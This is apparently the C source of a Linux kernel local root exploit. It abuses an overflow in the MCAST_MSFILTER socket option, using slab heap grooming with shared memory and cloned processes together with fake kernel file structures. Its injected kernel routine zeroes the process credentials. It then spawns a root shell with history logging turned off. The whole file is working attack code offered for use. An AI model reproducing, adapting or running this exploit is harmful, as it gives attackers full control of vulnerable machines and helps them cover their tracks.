< stuff/expl/linux/castity.c >

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/shm.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>

#define __u32 unsigned int
#define MCAST_MSFILTER 48
#define SOL_IP 0
#define SIZE 4096
#define R_FILE "/etc/passwd" // Set it to whatever file
you
can read. It's just for 1024 filling.

struct in_addr {
   unsigned int s_addr;
};

#define __SOCK_SIZE__ 16

struct sockaddr_in {
  unsigned short sin_family; /* Address family
    */
  unsigned short int sin_port; /* Port number
    */
  struct in_addr sin_addr; /* Internet address
    */

  /* Pad to size of `struct sockaddr'. */
  unsigned char __pad[__SOCK_SIZE__ - sizeof(short int) -
                        sizeof(unsigned short int) - sizeof(struct
in_addr)];
};

struct group_filter
{
        __u32 gf_interface; /* interface index
*/
        struct sockaddr_storage gf_group; /* multicast
address */
        __u32 gf_fmode; /* filter mode */
        __u32 gf_numsrc; /* number of
sources */
        struct sockaddr_storage gf_slist[1]; /* interface index
*/
};

struct damn_inode {
        void *a, *b;
        void *c, *d;
        void *e, *f;
        void *i, *l;
        unsigned long size[40]; // Yes, somewhere here :-)
} le;

struct dentry_suck {
        unsigned int count, flags;
        void *inode;
        void *dd;
} fucking = { 0xbad, 0xbad, &le, NULL };

struct fops_rox {
        void *a, *b, *c, *d, *e, *f, *g;
        void *mmap;
        void *h, *i, *l, *m, *n, *o, *p, *q, *r;
        void *get_unmapped_area;
} chien;

struct file_fuck {
        void *prev, *next;
        void *dentry;
        void *mnt;
        void *fop;
} gagne = { NULL, NULL, &fucking, NULL, &chien };

static char stack[16384];

int gotsig = 0,
                fillup_1024 = 0,
                fillup_64 = 0,
                uid, gid;

int *pid, *shmid;

static void sigusr(int b)
{
        gotsig = 1;
}

void fatal (char *str)
{
        fprintf(stderr, "[-] %s\n", str);
        exit(EXIT_FAILURE);
}

#define BUFSIZE 256

int calculate_slaboff(char *name)
{
        FILE *fp;
        char slab[BUFSIZE], line[BUFSIZE];
        int ret;
        /* UP case */
        int active_obj, total;

        bzero(slab, BUFSIZE);
        bzero(line, BUFSIZE);

        fp = fopen("/proc/slabinfo", "r");
        if ( fp == NULL )
                fatal("error opening /proc for slabinfo");

        fgets(slab, sizeof(slab) - 1, fp);
        do {
                ret = 0;
                if (!fgets(line, sizeof(line) - 1, fp))
                        break;
                ret = sscanf(line, "%s %u %u", slab, &active_obj,
&total);
        } while (strcmp(slab, name));

        close(fileno(fp));
        fclose(fp);

        return ret == 3 ? total - active_obj : -1;

}

int populate_1024_slab()
{
        int fd[252];
        int i;

        signal(SIGUSR1, sigusr);

        for ( i = 0; i < 252 ; i++)
                fd[i] = open(R_FILE, O_RDONLY);

        while (!gotsig)
                pause();
        gotsig = 0;

        for ( i = 0; i < 252; i++)
                close(fd[i]);

}

int kernel_code()
{
        int i, c;
        int *v;

        __asm__("movl %%esp, %0" : : "m" (c));

        c &= 0xffffe000;
         v = (void *) c;

        for (i = 0; i < 4096 / sizeof(*v) - 1; i++) {
                if (v[i] == uid && v[i+1] == uid) {
                        i++; v[i++] = 0; v[i++] = 0; v[i++] = 0;
                }
                if (v[i] == gid) {
                        v[i++] = 0; v[i++] = 0; v[i++] = 0; v[i++]
= 0;
                        return -1;
                }
        }

        return -1;
}

void prepare_evil_file ()
{
        int i = 0;

        chien.mmap = &kernel_code ; // just to pass do_mmap_pgoff
check
        chien.get_unmapped_area = &kernel_code;

        /*
         * First time i run the exploit i was using a precise
offset for
         * size, and i calculated it _wrong_. Since then my
lazyness took
         * over and i use that ""very clean"" *g* approach.
         * Why i'm telling you ? It's 3 a.m., i don't find any
better than
         * writing blubbish comments
         */

        for ( i = 0; i < 40; i++)
                le.size[i] = SIZE;

}

#define SEQ_MULTIPLIER 32768

void prepare_evil_gf ( struct group_filter *gf, int id )
{
        int filling_space = 64 - 4 *
sizeof(int);
        int i = 0;
        struct sockaddr_in *sin;

        filling_space /= 4;

        for ( i = 0; i < filling_space; i++ )
        {
              sin = (struct sockaddr_in *)&gf->gf_slist[i];
              sin->sin_family = AF_INET;
              sin->sin_addr.s_addr = 0x41414141;
        }

        /* Emulation of struct kern_ipc_perm */

        sin = (struct sockaddr_in *)&gf->gf_slist[i++];
        sin->sin_family = AF_INET;
        sin->sin_addr.s_addr = IPC_PRIVATE;

        sin = (struct sockaddr_in *)&gf->gf_slist[i++];
        sin->sin_family = AF_INET;
        sin->sin_addr.s_addr = uid;

        sin = (struct sockaddr_in *)&gf->gf_slist[i++];
        sin->sin_family = AF_INET;
        sin->sin_addr.s_addr = gid;

        sin = (struct sockaddr_in *)&gf->gf_slist[i++];
        sin->sin_family = AF_INET;
        sin->sin_addr.s_addr = uid;

        sin = (struct sockaddr_in *)&gf->gf_slist[i++];
        sin->sin_family = AF_INET;
        sin->sin_addr.s_addr = gid;

        sin = (struct sockaddr_in *)&gf->gf_slist[i++];
        sin->sin_family = AF_INET;
        sin->sin_addr.s_addr = -1;

        sin = (struct sockaddr_in *)&gf->gf_slist[i++];
        sin->sin_family = AF_INET;
        sin->sin_addr.s_addr = id/SEQ_MULTIPLIER;

        /* evil struct file address */

        sin = (struct sockaddr_in *)&gf->gf_slist[i++];
        sin->sin_family = AF_INET;
        sin->sin_addr.s_addr = (unsigned long)&gagne;

        /* that will stop mcast loop */

        sin = (struct sockaddr_in *)&gf->gf_slist[i++];
        sin->sin_family = 0xbad;
        sin->sin_addr.s_addr = 0xdeadbeef;

        return;

}

void cleanup ()
{
        int i = 0;
        struct shmid_ds s;

        for ( i = 0; i < fillup_1024; i++ )
        {
                kill(pid[i], SIGUSR1);
                waitpid(pid[i], NULL, __WCLONE);
        }

        for ( i = 0; i < fillup_64 - 2; i++ )
                shmctl(shmid[i], IPC_RMID, &s);

}

#define EVIL_GAP 4
#define SLAB_1024 "size-1024"
#define SLAB_64 "size-64"
#define OVF 21
#define CHUNKS 1024
#define LOOP_VAL 0x4000000f
#define CHIEN_VAL 0x4000000b

main()
{
        int sockfd, ret, i;
        unsigned int true_alloc_size, last_alloc_chunk,
loops;
        char *buffer;
        struct group_filter *gf;
        struct shmid_ds s;

        char *argv[] = { "le-chien", NULL };
        char *envp[] = { "TERM=linux", "PS1=le-chien\\$",
"BASH_HISTORY=/dev/null", "HISTORY=/dev/null", "history=/dev/null",
"PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin",
"HISTFILE=/dev/null", NULL };

        true_alloc_size = sizeof(struct group_filter) -
sizeof(struct
sockaddr_storage) + sizeof(struct sockaddr_storage) * OVF;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);

        uid = getuid();
        gid = getgid();

        gf = malloc (true_alloc_size);
        if ( gf == NULL )
                fatal("Malloc failure\n");

        gf->gf_interface = 0;
        gf->gf_group.ss_family = AF_INET;

        fillup_64 = calculate_slaboff(SLAB_64);

        if ( fillup_64 == -1 )
                fatal("Error calculating slab fillup\n");

        printf("[+] Slab %s fillup is %d\n", SLAB_64, fillup_64);

        /* Yes, two would be enough, but we have that "sexy"
#define, why
don't use it ? :-) */

        fillup_64 += EVIL_GAP;

        shmid = malloc(fillup_64 * sizeof(int));
        if ( shmid == NULL )
                fatal("Malloc failure\n");

        /* Filling up the size-64 and obtaining a new page with
EVIL_GAP
entries */

        for ( i = 0; i < fillup_64; i++ )
                shmid[i] = shmget(IPC_PRIVATE, 4096,
IPC_CREAT|SHM_R);

        prepare_evil_file();
        prepare_evil_gf(gf, shmid[fillup_64 - 1]);

        buffer = (char *)gf;

        fillup_1024 = calculate_slaboff(SLAB_1024);
        if ( fillup_1024 == -1 )
                fatal("Error calculating slab fillup\n");

        printf("[+] Slab %s fillup is %d\n", SLAB_1024,
fillup_1024);

        fillup_1024 += EVIL_GAP;

        pid = malloc(fillup_1024 * sizeof(int));
        if (pid == NULL )
                fatal("Malloc failure\n");

        for ( i = 0; i < fillup_1024; i++)
                pid[i] = clone(populate_1024_slab, stack +
sizeof(stack) -
4, 0, NULL);

        printf("[+] Attempting to trash size-1024 slab\n");

        /* Here starts the loop trashing size-1024 slab */

        last_alloc_chunk = true_alloc_size % CHUNKS;
        loops = true_alloc_size / CHUNKS;

        gf->gf_numsrc = LOOP_VAL;

        printf("[+] Last size-1024 chunk is of size %d\n",
last_alloc_chunk);
        printf("[+] Looping for %d chunks\n", loops);

        kill(pid[--fillup_1024], SIGUSR1);
        waitpid(pid[fillup_1024], NULL, __WCLONE);

        if ( last_alloc_chunk > 512 )
                ret = setsockopt(sockfd, SOL_IP, MCAST_MSFILTER,
buffer +
loops * CHUNKS, last_alloc_chunk);
        else

        /*
         * Should never happen. If it happens it probably means
that we've
         * bigger datatypes (or slab-size), so probably
         * there's something more to "fix me". The while loop below
is
         * already okay for the eventual fixing ;)
         */
  
              fatal("Last alloc chunk fix me\n");

        while ( loops > 1 )
        {
                kill(pid[--fillup_1024], SIGUSR1);
                waitpid(pid[fillup_1024], NULL, __WCLONE);

                ret = setsockopt(sockfd, SOL_IP, MCAST_MSFILTER,
buffer +
--loops * CHUNKS, CHUNKS);
        }

        /* Let's the real fun begin */

        gf->gf_numsrc = CHIEN_VAL;

        kill(pid[--fillup_1024], SIGUSR1);
        waitpid(pid[fillup_1024], NULL, __WCLONE);

        shmctl(shmid[fillup_64 - 2], IPC_RMID, &s);
        setsockopt(sockfd, SOL_IP, MCAST_MSFILTER, buffer, CHUNKS);

        cleanup();

        ret = (unsigned long)shmat(shmid[fillup_64 - 1], NULL,
SHM_RDONLY);

        if ( ret == -1)
        {
                printf("Le Fucking Chien GAGNE!!!!!!!\n");
                setresuid(0, 0, 0);
                setresgid(0, 0, 0);
                execve("/bin/sh", argv, envp);
                exit(0);
        }

        printf("Here we are, something sucked :/ (if not L1_cache
too big,
probably slab align, retry)\n" );

} 
